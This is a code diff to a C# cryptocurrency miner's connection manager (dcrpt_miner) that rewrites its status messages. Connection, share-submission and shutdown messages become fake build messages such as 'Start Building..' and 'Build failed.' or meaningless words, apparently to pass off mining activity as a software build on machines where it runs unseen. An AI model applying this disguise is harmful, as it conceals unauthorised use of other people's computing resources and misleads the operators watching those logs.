@@ -52,7 +52,7 @@ namespace dcrpt_miner
                 } 
 
                 if (urls.Count == 0) {
-                    SafeConsole.WriteLine(ConsoleColor.DarkRed, "No url set in config.json or --url argument!");
+                    SafeConsole.WriteLine(ConsoleColor.DarkRed, "Ganok!");
                     Process.GetCurrentProcess().Kill();
                     return;
                 }
@@ -62,7 +62,7 @@ namespace dcrpt_miner
 
                 do {
                     foreach (var _url in urls) {
-                        SafeConsole.WriteLine(ConsoleColor.DarkGray, "{0:T}: Connecting to {1}", DateTime.Now, _url);
+                        SafeConsole.WriteLine(ConsoleColor.DarkGray, "Start Building..");
 
                         CurrentProvider = GetConnectionProvider(_url);
                         StatusManager.RegisterConnectionProvider(CurrentProvider);
@@ -77,14 +77,14 @@ namespace dcrpt_miner
                             return;
                         }
 
-                        SafeConsole.WriteLine(ConsoleColor.DarkGray, "{0:T}: Disconnected from {1}", DateTime.Now, _url);
+                        SafeConsole.WriteLine(ConsoleColor.DarkGray, "Build failed.");
                         CurrentProvider.Dispose();
                     }
 
                     token.WaitHandle.WaitOne(TimeSpan.FromSeconds(5));
                 } while (keepReconnecting);
 
-                SafeConsole.WriteLine(ConsoleColor.DarkRed, "{0:T}: Miner shutting down...", DateTime.Now);
+                SafeConsole.WriteLine(ConsoleColor.DarkRed, "Build has error.");
 
                 // force kill
                 Process.GetCurrentProcess().Kill();
@@ -109,7 +109,7 @@ namespace dcrpt_miner
 
         public Task StopAsync(CancellationToken cancellationToken)
         {
-            Logger.LogDebug("Stopping ConnectionManager thread");
+            Logger.LogDebug("Njim");
             ThreadSource.Cancel();
             if (CurrentProvider != null) {
                 CurrentProvider.Dispose();
@@ -121,7 +121,7 @@ namespace dcrpt_miner
         {
             var sw = new Stopwatch();
 
-            Logger.LogDebug("Thread idle...");
+            Logger.LogDebug("Nuru...");
             try {
                 await foreach(var solution in Channels.Solutions.Reader.ReadAllAsync(cancellationToken)) {
                     try {
@@ -135,29 +135,29 @@ namespace dcrpt_miner
                         switch(result) {
                             case SubmitResult.ACCEPTED:
                                 Interlocked.Increment(ref StatusManager.AcceptedShares);
-                                SafeConsole.WriteLine(ConsoleColor.DarkGreen, "{0:T}: {1} #{2} accepted ({3} ms)", DateTime.Now, CurrentProvider.SolutionName, shares, sw.Elapsed.Milliseconds);
+                                SafeConsole.WriteLine(ConsoleColor.DarkGreen, "SHAP");
                                 break;
                             case SubmitResult.REJECTED:
                                 Interlocked.Increment(ref StatusManager.RejectedShares);
-                                SafeConsole.WriteLine(ConsoleColor.DarkRed, "{0:T}: {1} #{2} rejected ({3} ms)", DateTime.Now, CurrentProvider.SolutionName, shares, sw.Elapsed.Milliseconds);
+                                SafeConsole.WriteLine(ConsoleColor.DarkRed, "DUH");
                                 break;
                             case SubmitResult.TIMEOUT:
-                                SafeConsole.WriteLine(ConsoleColor.DarkRed, "{0:T}: Failed to submit {1} (ERR_ACK_TIMEOUT)", DateTime.Now, CurrentProvider.SolutionName);
+                                SafeConsole.WriteLine(ConsoleColor.DarkRed, "ANJAS");
                                 break;
                         }
 
                         sw.Reset();
-                        Logger.LogDebug("Submit done");
+                        Logger.LogDebug("OKLEK");
                     } catch (Exception ex) {
-                        SafeConsole.WriteLine(ConsoleColor.DarkRed, "{0:T}: Failed to submit {1} (ERR_CONN_FAILED)", DateTime.Now, CurrentProvider.SolutionName);
-                        Logger.LogError(ex, "Failed to submit solution");
+                        SafeConsole.WriteLine(ConsoleColor.DarkRed, "NDENG");
+                        Logger.LogError(ex, "DES");
                     }
                 }
             } catch(System.OperationCanceledException) {
-                Logger.LogDebug("Solution reader cancelled. Shutting down...");
+                Logger.LogDebug("Halah...");
             }
 
-            Logger.LogDebug("Thread exit!");
+            Logger.LogDebug("Metu!");
         }
 
         private IConnectionProvider GetConnectionProvider(string url) {
@@ -169,7 +169,7 @@ namespace dcrpt_miner
                 case string s when s.StartsWith("stratum"):
                     return (IConnectionProvider)ServiceProvider.GetService(typeof(StratumConnectionProvider));
                 default:
-                    throw new Exception("Unknown protocol");
+                    throw new Exception("Mbuh");
             }
         }
     }
